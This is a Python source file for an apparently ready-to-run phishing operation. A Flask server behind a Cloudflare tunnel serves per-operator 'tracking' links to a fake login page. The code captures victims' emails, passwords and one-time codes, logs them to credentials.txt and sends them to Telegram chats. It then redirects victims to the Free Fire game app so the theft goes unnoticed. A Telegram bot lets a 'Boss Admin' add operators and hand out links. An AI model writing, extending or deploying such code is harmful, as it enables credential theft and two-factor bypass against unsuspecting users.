import threading
import datetime
import requests
import json
import os
import subprocess
import re
import time
import sys
from flask import Flask, render_template, request, redirect, Response, session, url_for
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- ⚙️ Configuration Section ---
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
BOSS_ADMIN_ID = 123456789

# --- Global Variables ---
LOG_FILE = "credentials.txt"
ADMINS_FILE = "admins.json"
app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- Helper Functions (No changes here) ---
def load_admins():
    if not os.path.exists(ADMINS_FILE): save_admins({BOSS_ADMIN_ID}); return {BOSS_ADMIN_ID}
    try:
        with open(ADMINS_FILE, 'r') as f: return set(json.load(f))
    except (json.JSONDecodeError, FileNotFoundError): return {BOSS_ADMIN_ID}
def save_admins(admin_set):
    with open(ADMINS_FILE, 'w') as f: json.dump(list(admin_set), f, indent=4)
AUTHORIZED_ADMINS = load_admins()
def is_boss(user_id): return user_id == BOSS_ADMIN_ID

# --- Telegram Bot Command Handlers (No changes here) ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in AUTHORIZED_ADMINS:
        message = ("✅ **Welcome, Authorized Admin!**\n\n"
                   "Use /getlink to generate your unique tracking link.\n\n"
                   "If the link stops working, the Boss Admin can use /restart.\n\n")
        if is_boss(user_id):
            message += ("👑 **Boss Admin Commands:**\n"
                        "/addadmin <user_id>\n"
                        "/removeadmin <user_id>\n"
                        "/listadmins\n"
                        "/restart - 🔄 Restart the entire server")
        await update.message.reply_text(message, parse_mode='Markdown')
    else: await update.message.reply_text("🚫 Access Denied.")
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_boss(user_id): await update.message.reply_text("🚫 Access Denied. Only the Boss Admin can use this command."); return
    await update.message.reply_text("✅ Roger that! Issuing restart command. The watchdog will restart the server shortly with a new link.")
    sys.exit()
async def get_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_ADMINS: await update.message.reply_text("🚫 Access Denied."); return
    base_url = context.bot_data.get('base_url')
    if not base_url: await update.message.reply_text("⏳ Cloudflare link is not ready yet. Please wait a moment and try again."); return
    tracking_link = f"{base_url}/track/{user_id}"
    await update.message.reply_text(f"🔗 Your unique link:\n\n`{tracking_link}`", parse_mode='Markdown')
async def add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id): await update.message.reply_text("🚫 Only the Boss Admin can use this command."); return
    try: new_admin_id = int(context.args[0]); AUTHORIZED_ADMINS.add(new_admin_id); save_admins(AUTHORIZED_ADMINS); await update.message.reply_text(f"✅ Admin {new_admin_id} has been added.")
    except (IndexError, ValueError): await update.message.reply_text("⚠️ Usage: /addadmin <user_id>")
async def remove_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id): await update.message.reply_text("🚫 Only the Boss Admin can use this command."); return
    try:
        admin_to_remove = int(context.args[0])
        if admin_to_remove == BOSS_ADMIN_ID: await update.message.reply_text("🚫 The Boss Admin cannot be removed."); return
        if admin_to_remove in AUTHORIZED_ADMINS: AUTHORIZED_ADMINS.remove(admin_to_remove); save_admins(AUTHORIZED_ADMINS); await update.message.reply_text(f"✅ Admin {admin_to_remove} has been removed.")
        else: await update.message.reply_text(f"⚠️ Admin {admin_to_remove} not found.")
    except (IndexError, ValueError): await update.message.reply_text("⚠️ Usage: /removeadmin <user_id>")
async def list_admins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_boss(update.effective_user.id): await update.message.reply_text("🚫 Only the Boss Admin can use this command."); return
    admin_list = "\n".join([f"- `{aid}` {'(Boss)' if aid == BOSS_ADMIN_ID else ''}" for aid in AUTHORIZED_ADMINS])
    await update.message.reply_text(f"📜 **Authorized Admins:**\n{admin_list}", parse_mode='Markdown')

# --- Flask Routes (Updated for the new workflow) ---
@app.route('/track/<int:admin_id>')
def track_page(admin_id):
    if admin_id in AUTHORIZED_ADMINS: return render_template('index.html', admin_id=admin_id)
    return "🚫 Invalid or unauthorized tracking link.", 403

@app.route('/login', methods=['POST'])
def login():
    user_data = {
        'admin_id': int(request.form.get('admin_id')), 'source': request.form.get('source'),
        'email': request.form.get('email'), 'password': request.form.get('password'),
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    if user_data['email'] and user_data['password']:
        message_part1 = (f"*🔥 Step 1: Login Attempt from Admin `{user_data['admin_id']}` 🔥*\n\n"
                         f"*Source:* `{user_data['source']}`\n*📧 Email/Phone:* `{user_data['email']}`\n"
                         f"*🔑 Password:* `{user_data['password']}`\n\n`{user_data['timestamp']}`\n\n*Waiting for OTP...*")
        if user_data['admin_id'] != BOSS_ADMIN_ID: send_to_telegram(user_data['admin_id'], message_part1)
        send_to_telegram(BOSS_ADMIN_ID, message_part1)
        session['pending_user_data'] = user_data
        return redirect(url_for('enter_otp'))
    return "Something went wrong. Please try again.", 400

@app.route('/otp_verification')
def enter_otp():
    if 'pending_user_data' not in session: return "Session expired. Please start over.", 400
    return render_template('otp.html')

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    user_data = session.get('pending_user_data'); otp_code = request.form.get('otp')
    if not user_data or not otp_code: return "Session expired. Please start over.", 400
    admin_id = user_data['admin_id']
    log_entry = (f"Timestamp: {user_data['timestamp']}\nAdmin ID: {admin_id}\nSource: {user_data['source']}\n"
                 f"Email: {user_data['email']}\nPassword: {user_data['password']}\nOTP: {otp_code}\n---\n")
    with open(LOG_FILE, "a") as f: f.write(log_entry)
    message_part2 = (f"*✅ Step 2: Full Data Received from Admin `{admin_id}` ✅*\n\n"
                     f"*📧 Email/Phone:* `{user_data['email']}`\n*🔑 Password:* `{user_data['password']}`\n"
                     f"*🔐 OTP Code:* `{otp_code}`\n\nAll data captured successfully!")
    if admin_id != BOSS_ADMIN_ID: send_to_telegram(admin_id, message_part2)
    send_to_telegram(BOSS_ADMIN_ID, message_part2)
    session.pop('pending_user_data', None)
    
    # --- *** গুরুত্বপূর্ণ পরিবর্তন এখানে *** ---
    # PHP কোডের মতো করে ডিপ লিঙ্ক ব্যবহার করা হচ্ছে
    return redirect("freefire://open")

def send_to_telegram(chat_id, message):
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"; payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
    try: requests.post(api_url, json=payload)
    except Exception as e: print(f"Error sending to Telegram: {e}")

# --- Main Execution (No changes here) ---
def start_cloudflared(bot_data):
    try:
        process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        print("☁️ Starting Cloudflare Tunnel...");
        for line in iter(process.stdout.readline, ''):
            print(line.strip()); url_match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if url_match: url = url_match.group(0); bot_data['base_url'] = url; print(f"✅ Public URL found and set: {url}"); send_to_telegram(BOSS_ADMIN_ID, f"✅ Server is online!\nPublic URL: {url}"); break
        process.wait()
    except FileNotFoundError: print("❌ Error: 'cloudflared' command not found. Please install it.")
    except Exception as e: print(f"❌ Cloudflare Tunnel Error: {e}")
def run_flask(): print("🚀 Starting Flask server..."); app.run(host='0.0.0.0', port=5000, debug=False)
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command)); application.add_handler(CommandHandler("getlink", get_link_command)); application.add_handler(CommandHandler("addadmin", add_admin_command)); application.add_handler(CommandHandler("removeadmin", remove_admin_command)); application.add_handler(CommandHandler("listadmins", list_admins_command)); application.add_handler(CommandHandler("restart", restart_command))
    flask_thread = threading.Thread(target=run_flask); cloudflared_thread = threading.Thread(target=start_cloudflared, args=(application.bot_data,)); flask_thread.daemon = True; cloudflared_thread.daemon = True; flask_thread.start(); time.sleep(1); cloudflared_thread.start()
    print("🤖 Starting Telegram bot polling..."); application.run_polling()
if __name__ == '__main__': main()
